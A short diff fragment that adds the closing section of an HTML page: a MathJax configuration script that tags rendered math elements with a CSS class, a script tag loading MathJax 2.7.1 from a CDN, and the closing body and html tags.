+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
